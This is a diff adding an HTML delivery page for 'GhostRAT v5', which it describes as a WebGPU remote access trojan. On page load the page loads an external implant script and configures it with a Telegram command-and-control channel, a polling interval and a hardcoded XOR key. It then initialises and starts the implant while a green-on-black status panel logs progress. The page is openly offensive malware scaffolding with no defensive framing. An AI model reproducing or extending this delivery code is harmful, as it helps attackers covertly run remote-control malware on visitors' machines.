@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostRAT v5 - GPU VRAM Compute Shader RAT</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: #0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        #status {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #111;
+            padding: 10px;
+            border: 1px solid #0f0;
+            font-size: 12px;
+        }
+        #log {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #111;
+            padding: 20px;
+            border: 1px solid #0f0;
+            min-height: 400px;
+            white-space: pre-wrap;
+        }
+        .log-entry {
+            margin: 5px 0;
+        }
+        .log-entry.info { color: #0f0; }
+        .log-entry.warn { color: #ff0; }
+        .log-entry.error { color: #f00; }
+    </style>
+</head>
+<body>
+    <div id="status">
+        <div>Status: <span id="status-text">Initializing...</span></div>
+        <div>C2: <span id="c2-status">Disconnected</span></div>
+        <div>GPU: <span id="gpu-status">Not initialized</span></div>
+    </div>
+    
+    <div id="log"></div>
+
+    <script src="ghostrat-webgpu.js"></script>
+    <script>
+        // ============================================================
+        // GhostRAT v5 WebGPU Implant — Delivery Page
+        // ============================================================
+        
+        const log = document.getElementById('log');
+        const statusText = document.getElementById('status-text');
+        const c2Status = document.getElementById('c2-status');
+        const gpuStatus = document.getElementById('gpu-status');
+        
+        function addLog(message, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toISOString()}] ${message}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        // Initialize GhostRAT v5
+        async function init() {
+            try {
+                // Check WebGPU support
+                if (!navigator.gpu) {
+                    addLog('WebGPU not supported in this browser', 'error');
+                    statusText.textContent = 'Error';
+                    gpuStatus.textContent = 'Not supported';
+                    return;
+                }
+                
+                addLog('WebGPU supported, initializing implant...');
+                gpuStatus.textContent = 'Initializing...';
+                
+                // Create GhostRAT v5 instance
+                const config = {
+                    c2Channel: 'telegram',  // Primary C2 channel
+                    pollInterval: 5000,     // Poll every 5 seconds
+                    cryptoKey: 'GHOSTRATV5' // XOR encryption key
+                };
+                
+                const implant = new GhostRatV5(config);
+                
+                // Initialize implant
+                const initialized = await implant.init();
+                if (!initialized) {
+                    addLog('Failed to initialize implant', 'error');
+                    statusText.textContent = 'Error';
+                    gpuStatus.textContent = 'Failed';
+                    return;
+                }
+                
+                addLog('Implant initialized successfully');
+                statusText.textContent = 'Running';
+                gpuStatus.textContent = 'Active';
+                
+                // Start implant
+                implant.start();
+                addLog('Implant started');
+                
+            } catch (error) {
+                addLog(`Initialization error: ${error.message}`, 'error');
+                statusText.textContent = 'Error';
+                gpuStatus.textContent = 'Failed';
+            }
+        }
+        
+        // Start implant when page loads
+        window.addEventListener('load', init);
+    </script>
+</body>
+</html>
